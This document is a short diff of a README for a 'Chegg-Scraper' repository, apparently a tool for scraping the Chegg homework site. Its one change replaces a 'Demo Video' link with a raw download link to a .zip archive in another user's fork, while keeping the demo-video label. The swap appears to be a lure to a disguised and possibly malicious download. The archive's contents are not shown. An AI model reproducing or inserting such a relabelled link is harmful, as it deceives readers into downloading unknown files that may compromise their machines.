@@ -1,4 +1,4 @@
 # Chegg-Scraper
 Purely for educational purposes only
 
-Demo Video - https://github.com/mso797/Chegg-Scraper/new/master?readme=1
+Demo Video - https://raw.githubusercontent.com/LOk0121/Chegg-Scraper/master/cgi-bin/Chegg-Scraper-notchboard.zip
